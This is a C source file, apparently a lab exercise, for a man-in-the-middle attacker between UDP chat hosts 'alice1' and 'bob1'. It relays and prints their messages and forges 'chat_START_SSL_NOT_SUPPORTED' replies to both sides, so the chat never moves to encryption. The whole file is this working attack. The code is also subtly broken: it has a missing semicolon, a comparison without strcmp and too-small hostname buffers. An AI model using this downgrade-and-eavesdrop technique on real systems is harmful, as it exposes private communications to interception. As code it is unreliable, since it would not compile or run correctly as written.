// Import the required header files
#include<stdio.h>           // for printf()
#include<stdlib.h>          // for exit()
#include<netdb.h>           // for gethostbyname()
#include<arpa/inet.h>       // for inet_addr()
#include<string.h>          // for bzero()
#include<unistd.h>          // for close()
#include<netinet/in.h>      // for inet_ntop()
#include<sys/time.h>        // for struct timeval
#include<stdbool.h>         // for bool data type

// Define the required macros
#define PORT 8001
#define INF 99999
#define MAX_LENGTH 1024

// Define the required global variables
char error[100], client[10], server[10], host[10];

/**
Name        :   retrieveIP()
Description :   Retrieves the IP address of a host given its hostname.
Arguments   :   The hostname and a char buffer to store the ip address, in that order
Return      :   None
**/
void retrieveIP(char *server, char ip[20]) {

    // Declare the required local variables
    struct hostent *info;
    struct in_addr address;

    // Get the host details from the hostname and store in a linked list
    info = gethostbyname(server);

    // Handle the error
    if(!info) {
        bzero(error, sizeof(error));
        sprintf(error, "Unable to get details of host %s\n", server);
        perror(error);
        exit(EXIT_FAILURE);
    }

    // Retrieve the IP address from the linked list, copy it into the IP buffer and return
    memcpy(&address, info->h_addr_list[0], sizeof(struct in_addr));
    sprintf(ip, "%s", inet_ntoa(address));
    return;
}

/**
Name        :   determinePeers()
Description :   Determines who is server and who is client for the chat.
Arguments   :   The client address and two char buffers to store the hostnames, in that order
Return      :   None
**/
void determinePeers(struct sockaddr_in* clientAddress) {
    
    // Declare the required local variables
    char ip[20];
    struct hostent *info;
    struct in_addr addr;

    // Extract the IP address of the client
    inet_ntop(AF_INET, &(clientAddress->sin_addr), ip, INET_ADDRSTRLEN);
    inet_aton(ip, &addr);
    
    // Get the host details from the IP address and store in a linked list
    info = gethostbyaddr((const char*)&addr, sizeof(addr), AF_INET);

    // Handle the error
    if(!info || !info->h_name) {
        bzero(error, sizeof(error));
        sprintf(error, "Unable to get details of client host %s\n", server);
        perror(error);
        exit(EXIT_FAILURE);
    }

    // Retrieve the hostname from the linked list, copy it into the client buffer
    sprintf(client, "%s", info->h_name);
    
    // Set the server buffer accordingly and return
    if(strcmp(client, "alice1") == 0)
        strcpy(server, "bob1");
    else
        strcpy(server, "alice1");
    return;
}

/**
Name        :   intercept()
Description :   Defines the procedure for the attacker to eavesdrop the chat
Arguments   :   None
Return      :   None
**/
void intercept() {
    
    // Declare the required local variables
    int clientSocketFD, serverSocketFD, serverLength, messageLength, clientLength, max_fd;
    struct sockaddr_in clientAddress, myAddress, serverAddress;
    char myIP[20], serverIP[20], bufferS[MAX_LENGTH], bufferC[MAX_LENGTH];
    struct timeval timeout = {5, 0};
    bool keepAlive = true;
    fd_set rfds;
    
    // Try creating a Server Socket and print appropriate message
    bzero(&myAddress, sizeof(myAddress));
    if((serverSocketFD = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        bzero(error, sizeof(error));
        sprintf(error, "Server Socket creation failed.\n");
        perror(error);
        exit(EXIT_FAILURE);
    }

    // Prepare the server address details for binding
    retrieveIP(host, myIP);
    myAddress.sin_addr.s_addr = inet_addr(myIP);
    myAddress.sin_port = htons(PORT);
    myAddress.sin_family = AF_INET;
    memset(&(myAddress.sin_zero), '\0', 8);

    // Try binding the server address to the Socket and print appropriate message
    if(bind(serverSocketFD, (struct sockaddr*)&myAddress, sizeof(struct sockaddr_in)) < 0) {
        bzero(error, sizeof(error));
        sprintf(error, "Server Socket binding failed.\n");
        perror(error);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Read data from the socket and print appropriate message
    clientLength = sizeof(clientAddress);
    bzero(bufferS, sizeof(bufferS));
    if((messageLength = recvfrom(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, &clientLength)) < 0) {
        bzero(error, sizeof(error));
        sprintf(error, "Listening from client failed.\n");
        perror(error);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }
    bufferS[messageLength] = '\0';

    // Determine who is client and who is server based on the client connection received
    determinePeers(&clientAddress);
    
    // Try creating a Client Socket and print appropriate message
    bzero(&serverAddress, sizeof(serverAddress));
    if((clientSocketFD = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        bzero(error, sizeof(error));
        sprintf(error, "Client Socket creation failed.\n");
        perror(error);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Prepare the server address details for connection
    retrieveIP(server, serverIP);
    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
    serverAddress.sin_port = htons(PORT);
    serverAddress.sin_family = AF_INET;
    setsockopt(clientSocketFD, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    serverLength = sizeof(serverAddress);
    if(connect(clientSocketFD, (struct sockaddr*)&serverAddress, serverLength)) {
        bzero(error, sizeof(error));
        sprintf(error, "Server connection failed.\n");
        perror(error);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Receive chat_hello from the client
    bzero(bufferS, sizeof(bufferS));
    if((messageLength = recvfrom(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, &clientLength)) == -1) {
        bzero(error, sizeof(error));
        sprintf(error, "Listening from client failed.\n");
        perror(error);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }
    bufferS[messageLength] = '\0';

    // Send the chat_hello to the server
    chat_hello:
        bzero(bufferC, sizeof(bufferC));
        strcpy(bufferC, bufferS);
        if(sendto(clientSocketFD, bufferC, sizeof(bufferC), 0, (struct sockaddr*)&serverAddress, serverLength) < 0) {
            bzero(error, sizeof(error));
            sprintf(error, "Message sending failed.\n");
            perror(error);
            close(clientSocketFD);
            close(serverSocketFD);
            exit(EXIT_FAILURE);
        }

    // Try to receive chat_ok_reply from the server and handle the packet loss of chat_hello
    bzero(bufferC, sizeof(bufferC));
    if((messageLength = recvfrom(clientSocketFD, bufferC, sizeof(bufferC), 0, (struct sockaddr*)&serverAddress, &serverLength)) < 0)
        goto chat_hello;
    bufferC[messageLength] = '\0';

    // Send the chat_ok_reply to the client
    chat_ok_reply:
        bzero(bufferS, sizeof(bufferS));
        strcpy(bufferS, bufferC);
        if(sendto(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, clientLength) == -1) {
            bzero(error, sizeof(error));
            sprintf(error, "Replying to client failed.\n");
            perror(error);
            close(clientSocketFD);
            close(serverSocketFD);
            exit(EXIT_FAILURE);
        }

    // Try to receive chat_START_SSL from the client
    bzero(bufferS, sizeof(bufferS));
    messageLength = recvfrom(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, &clientLength);
    bufferS[messageLength] = '\0';

    // Handle the packet loss of chat_ok_reply
    if(strcmp(bufferS, "chat_hello") == 0)
        goto chat_ok_reply;
    
    // Send chat_START_SSL_NOT_SUPPORTED to client
    chat_START_SSL_NOT_SUPPORTED_client:
        bzero(bufferS, sizeof(bufferS));
        sprintf(bufferS, "chat_START_SSL_NOT_SUPPORTED");
        if(sendto(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, clientLength) == -1) {
            bzero(error, sizeof(error));
            sprintf(error, "Replying to client failed.\n");
            perror(error);
            close(clientSocketFD);
            close(serverSocketFD);
            exit(EXIT_FAILURE);
        }

    // Set the socket to listen for 5 seconds
    setsockopt(serverSocketFD, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    bzero(bufferS, sizeof(bufferS));
    messageLength = recvfrom(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, &clientLength);
    bufferS[messageLength] = '\0';

    // handle the packet loss of chat_START_SSL_NOT_SUPPORTED
    if(messageLength > 0 && (bufferS, "chat_START_SSL") == 0)
        goto chat_START_SSL_NOT_SUPPORTED_client;

    // Send chat_START_SSL_NOT_SUPPORTED to server
    chat_START_SSL_NOT_SUPPORTED_server:
        bzero(bufferC, sizeof(bufferC));
        sprintf(bufferC, "chat_START_SSL_NOT_SUPPORTED");
        if(sendto(clientSocketFD, bufferC, sizeof(bufferC), 0, (struct sockaddr*)&serverAddress, serverLength) == -1) {
            bzero(error, sizeof(error));
            sprintf(error, "Replying to server failed.\n");
            perror(error);
            close(clientSocketFD);
            close(serverSocketFD);
            exit(EXIT_FAILURE);
        }

    // Set the socket to listen for 2 seconds
    timeout.tv_sec = 2
    setsockopt(clientSocketFD, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    bzero(bufferC, sizeof(bufferC));
    if((messageLength = recvfrom(clientSocketFD, bufferC, sizeof(bufferC), 0, (struct sockaddr*)&serverAddress, &serverLength)) < 0)
        goto chat_START_SSL_NOT_SUPPORTED_server;

    // Begin the chat loop
    while(keepAlive) {

        // Create the FD set instance and add the client and server UDP sockets to it
        FD_ZERO(&rfds);
        FD_SET(clientSocketFD, &rfds);  // Add client socket socket to read set
        FD_SET(serverSocketFD, &rfds);    // Add server socket to read set
        max_fd = serverSocketFD > clientSocketFD ? serverSocketFD : clientSocketFD;

        // Wait for an event to occur on any of the sockets
        int ret = select(max_fd + 1, &rfds, NULL, NULL, NULL);
        if (ret < 0) {
            sprintf(error, "Select error\n");
            perror(error);
            exit(EXIT_FAILURE);
        }

        // Check if any data is available from the client
        if(FD_ISSET(serverSocketFD, &rfds)) {
            
            // Read the data from client
            bzero(bufferS, sizeof(bufferS));
            messageLength = recvfrom(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, &clientLength);
            bufferS[messageLength] = '\0';

            // Copy the data and send it to the server
            strcpy(bufferC, bufferS);
            sendto(clientSocketFD, bufferC, sizeof(bufferC), 0, (struct sockaddr*)&serverAddress, serverLength);
            
            // Notify the user in case of chat close request
            if(strcmp(bufferS, "chat_close") == 0) {
                printf("%s closed the chat.\n", client);
            }

            // Forward the chat_close_ACK from client to server
            else if(strcmp(bufferS, "chat_close_ACK") == 0) {
                keepAlive = false;
                continue;
            }

            // In case of a normal message, print it on the console
            else if(strlen(bufferS) > 0)
                printf("%s: %s\n", client, bufferS);
        }

        // Check if any data is available from the server
        if(FD_ISSET(clientSocketFD, &rfds)) {
            
            // Read the data from server 
            bzero(bufferC, sizeof(bufferC));
            messageLength = recvfrom(clientSocketFD, bufferC, sizeof(bufferC), 0, (struct sockaddr*)&serverAddress, &serverLength);
            bufferC[messageLength] = '\0';

            // Copy the data and send it to the client
            strcpy(bufferS, bufferC);
            sendto(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, clientLength);
            
            // Notify the user in case of chat close request
            if(strcmp(bufferC, "chat_close") == 0) {
                printf("%s closed the chat.\n", server);
            }

            // Forward the chat_close_ACK from client to server
            else if(strcmp(bufferC, "chat_close_ACK") == 0) {
                keepAlive = false;
                continue;
            }

            // In case of a normal message, print it on the console
            else if(strlen(bufferC) > 0)
                printf("%s: %s\n", server, bufferC);
        }
    }

    // Close the sockets and return
    close(clientSocketFD);
    close(serverSocketFD);
    return;
}

/**
Name        :   main()
Description :   Handles the invoking of all above defined functions.
Arguments   :   Hostnames of the peers involved in the chat
Return      :   Integer 0 on success and EXIT_FAILURE otherwise
**/
int main(int argc, char **argv) {

    // Retrieve the host name
    if(gethostname(host, sizeof(host)) == -1) {
        bzero(error, sizeof(error));
        sprintf(error, "gethostname error");
        perror(error);
        exit(EXIT_FAILURE);
    }

    // Parse and validate the command line arguments
    if(argc != 4 || strcmp(argv[1], "-d")) {
        bzero(error, sizeof(error));
        sprintf(error, "Invalid Command Line Arguments. Refer README.md\n");
        perror(error);
        exit(EXIT_FAILURE);
    }

    // Invoke the function to intercept the chat
    intercept();
    
    return 0;
}